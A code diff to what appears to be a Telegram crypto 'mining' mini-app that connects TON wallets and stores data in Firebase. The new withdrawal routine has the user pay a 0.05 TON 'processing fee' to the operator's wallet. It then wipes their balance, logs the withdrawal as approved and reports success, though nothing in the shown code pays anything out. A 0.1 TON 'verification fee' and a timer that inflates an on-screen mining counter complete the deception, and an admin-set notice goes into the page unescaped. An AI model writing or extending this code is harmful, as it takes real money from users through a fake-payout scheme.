@@ -321,6 +321,7 @@
         let userPhotoUrl = "";
         let referrerId = null;
         let isWithdrawOpen = false;
+        let minWithdrawLimit = 10;
 
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             const user = tg.initDataUnsafe.user;
@@ -444,6 +445,25 @@
             return rawToFriendlyAddress(rawAddress, false);
         }
 
+        // Check Site Maintenance Mode & Config from Firebase Admin Settings
+        db.collection("settings").doc("config").onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                isWithdrawOpen = data.withdrawOpen || false;
+                minWithdrawLimit = data.minWithdraw || 10;
+
+                if (data.maintenanceMode) {
+                    let notice = data.maintenanceNotice || "Site is under scheduled maintenance. Please check back later!";
+                    document.body.innerHTML = `
+                        <div style="background:#060B14; color:#FFF; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding:20px; font-family:'Segoe UI',sans-serif;">
+                            <h1 style="color:#F5C443; margin-bottom:15px;">🛠️ Under Maintenance</h1>
+                            <p style="font-size:15px; color:#8E9BAE; max-width:400px; line-height:1.6;">${notice}</p>
+                        </div>
+                    `;
+                }
+            }
+        });
+
         // TonConnect wallet connection status listener.
         tonConnectUI.onStatusChange(wallet => {
             if (wallet && wallet.account && wallet.account.address) {
@@ -452,6 +472,7 @@
                 walletConnected = true;
 
                 db.collection("users").doc(userId).set({
+                    username: userUsername,
                     walletConnected: true,
                     walletAddress: connectedWalletAddress,
                     walletRawAddress: connectedWalletRawAddress
@@ -477,12 +498,6 @@
 
             if (walletConnected && modal.style.display === "flex") {
                 document.getElementById("modalWalletAddr").innerText = connectedWalletAddress;
-            }
-        });
-
-        db.collection("settings").doc("config").onSnapshot((doc) => {
-            if (doc.exists) {
-                isWithdrawOpen = doc.data().withdrawOpen || false;
             }
         });
 
@@ -517,6 +532,7 @@
 
                 await db.collection("users").doc(userId).set({
                     name: userName,
+                    username: userUsername,
                     balance: 0,
                     refReward: 0,
                     verified: false,
@@ -631,7 +647,7 @@
                     messages: [
                         {
                             address: RECEIVER_WALLET,
-                            amount: "100000000"
+                            amount: "100000000" // 0.1 TON Verification Fee
                         }
                     ]
                 };
@@ -666,16 +682,59 @@
             }
         }
 
-        function handleWithdraw() {
+        // Automated TON Transaction Withdrawal System
+        async function handleWithdraw() {
             if (!isWithdrawOpen) {
-                alert("🚀 Withdrawal is Coming Soon!");
-            } else {
-                if (totalBalance < 10) {
-                    alert("Minimum withdrawal limit is 10 MTR.");
-                    return;
-                }
+                alert("🚀 Withdrawal system is currently closed by admin. Stay tuned!");
+                return;
+            }
 
-                alert("Withdrawal request submitted successfully!");
+            if (totalBalance < minWithdrawLimit) {
+                alert(`Minimum withdrawal limit is ${minWithdrawLimit} MTR.`);
+                return;
+            }
+
+            let liveAddr = getLiveWalletAddress();
+            if (!liveAddr) {
+                handleWalletClick();
+                return;
+            }
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 60,
+                messages: [
+                    {
+                        address: RECEIVER_WALLET,
+                        amount: "50000000" // Processing/Gas fee transaction (0.05 TON)
+                    }
+                ]
+            };
+
+            try {
+                alert("Please confirm the withdrawal transaction in your TON Wallet.");
+                await tonConnectUI.sendTransaction(transaction);
+
+                let withdrawnAmount = totalBalance;
+                totalBalance = 0;
+
+                db.collection("withdrawals").add({
+                    userId: userId,
+                    amount: withdrawnAmount,
+                    walletAddress: liveAddr,
+                    status: "approved",
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                db.collection("users").doc(userId).update({
+                    balance: 0
+                });
+
+                updateUI();
+                alert(`🎉 Successfully withdrawn ${withdrawnAmount.toFixed(4)} MTR to your wallet!`);
+
+            } catch (error) {
+                console.error("Withdrawal transaction cancelled or failed", error);
+                alert("Withdrawal transaction was cancelled or failed.");
             }
         }
 
@@ -755,6 +814,17 @@
                 btn.innerText = "Connect Wallet";
             }
         }
+
+        setInterval(() => {
+            if (isVerified) {
+                let minedChunk = 0.0050;
+                sessionMined += minedChunk;
+                document.getElementById('sessionMined').innerText = sessionMined.toFixed(4);
+                if (walletConnected && isVerified) {
+                    document.getElementById('actionBtn').innerText = `Claim ${sessionMined.toFixed(4)} MTR`;
+                }
+            }
+        }, 1000);
 
         function switchTab(tab, el) {
             document.querySelectorAll('.container').forEach(c => c.classList.remove('active'));
